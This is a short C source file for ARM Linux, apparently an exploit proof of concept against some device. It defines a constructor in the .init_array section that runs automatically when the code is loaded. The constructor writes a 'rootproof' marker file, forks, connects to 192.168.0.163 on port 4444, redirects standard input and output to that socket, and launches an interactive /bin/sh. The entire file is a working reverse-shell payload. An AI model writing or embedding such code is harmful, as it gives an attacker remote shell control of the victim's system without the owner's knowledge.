typedef unsigned short u16;
typedef unsigned int u32;

struct sockaddr_in {
    u16 family;
    u16 port;
    u32 addr;
    unsigned char zero[8];
};

static long sc(long n, long a, long b, long c)
{
    register long r7 __asm__("r7") = n;
    register long r0 __asm__("r0") = a;
    register long r1 __asm__("r1") = b;
    register long r2 __asm__("r2") = c;
    __asm__ volatile("svc 0" : "+r"(r0) : "r"(r7), "r"(r1), "r"(r2) : "memory");
    return r0;
}

static void root_connect(void)
{
    const char marker[] = "VCM constructor executed\n";
    long proof = sc(5, (long)"/mnt/datafs/cosmocat/rootproof", 0x241, 0666);
    if (proof >= 0) {
        sc(4, proof, (long)marker, sizeof(marker) - 1);
        sc(6, proof, 0, 0);
    }

    long pid = sc(2, 0, 0, 0);                 /* fork */
    if (pid != 0) return;

    long fd = sc(281, 2, 1, 0);                /* socket(AF_INET, SOCK_STREAM, 0) */
    if (fd < 0) sc(1, 111, 0, 0);

    struct sockaddr_in sa = {2, 0x5c11, 0xa300a8c0U, {0}}; /* 192.168.0.163:4444 */
    if (sc(283, fd, (long)&sa, 16) < 0) sc(1, 112, 0, 0);

    sc(63, fd, 0, 0);
    sc(63, fd, 1, 0);
    sc(63, fd, 2, 0);
    char *argv[] = {"sh", "-i", 0};
    char *envp[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", 0};
    sc(11, (long)"/bin/sh", (long)argv, (long)envp);
    sc(1, 113, 0, 0);
}

__attribute__((section(".init_array"), used))
static void (*init_entry)(void) = root_connect;
